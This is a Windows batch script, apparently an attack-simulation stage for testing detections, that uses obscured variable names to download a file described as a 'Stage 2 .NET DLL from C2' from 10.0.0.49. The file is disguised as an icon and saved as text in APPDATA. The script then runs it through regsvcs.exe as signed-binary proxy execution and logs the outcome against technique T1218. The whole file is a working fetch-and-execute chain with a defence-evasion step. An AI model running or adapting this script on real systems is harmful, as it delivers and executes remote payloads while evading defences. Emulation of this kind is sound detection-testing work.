@echo off
setlocal enabledelayedexpansion

REM ============================================================
REM Placeholder constant declarations (random-named SET vars)
REM ============================================================
SET aBcD1=%APPDATA%\12062\fa2d6c57
SET eFgH2=d62d0373.txt
SET iJkL3=https://10.0.0.49/stage/2/icon.png?12062-7
SET mNoP4=ITZEL-S2B
SET qRsT5=12062
SET uVwX6=7
SET yZ01=%PUBLIC%\\macula-simulations.log
SET bCd2=https://10.0.0.49

REM ============================================================
REM Capture initial timestamp for debug logging (reused throughout)
REM ============================================================
SET tsvar=!DATE!/!TIME!

REM ============================================================
REM Debug: script start
REM ============================================================
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: script_start>> "!yZ01!" 2>nul

REM ============================================================
REM Step 1: Heartbeat fetch – download Stage 2 .NET DLL from C2
REM Force creation of output directory before download
REM ============================================================
if not exist "!aBcD1!" (
    mkdir "!aBcD1!" >nul 2>&1
)
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: heartbeat_start>> "!yZ01!" 2>nul
curl -k -s -o "!aBcD1!\!eFgH2!" "!iJkL3!"
if !errorlevel! neq 0 (
    echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: heartbeat_result=!errorlevel!>> "!yZ01!" 2>nul
    REM Skip to TTP log with FAIL
) else (
    echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: heartbeat_result=0>> "!yZ01!" 2>nul
)
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: heartbeat_complete>> "!yZ01!" 2>nul

REM ============================================================
REM Step 2: Position working directory to output directory
REM ============================================================
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: chdir_start>> "!yZ01!" 2>nul
cd /d "!aBcD1!" >nul 2>&1
if !errorlevel! equ 0 (
    echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: chdir_result=0>> "!yZ01!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: chdir_result=!errorlevel!>> "!yZ01!" 2>nul
)

REM ============================================================
REM Step 3: Invoke Stage 2 .NET DLL via regsvcs.exe /U
REM Use x64 .NET Framework 4.x path (common for modern systems)
REM ============================================================
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: regsvcs_start>> "!yZ01!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U "!eFgH2!" >NUL 2>&1
set regsvcs_exit=!errorlevel!
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: regsvcs_result=!regsvcs_exit!>> "!yZ01!" 2>nul

REM ============================================================
REM Step 4: Generate timestamp for TTP log line and emit it
REM ============================================================
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set ttp_timestamp=%%t

if !regsvcs_exit! equ 0 (
    set ttp_result=OK
    set ttp_error=
) else (
    set ttp_result=FAIL
    set ttp_error=regsvcs_exit_!regsvcs_exit!
)

echo [!ttp_timestamp!][TTP][!mNoP4!][!qRsT5!]: T1218^|System Binary Proxy Execution=[!ttp_result!]:[!ttp_error!]>> "!yZ01!" 2>&1

REM ============================================================
REM Debug: script end
REM ============================================================
echo [!tsvar!][DEBUG][!mNoP4!][!qRsT5!]: script_end>> "!yZ01!" 2>nul

endlocal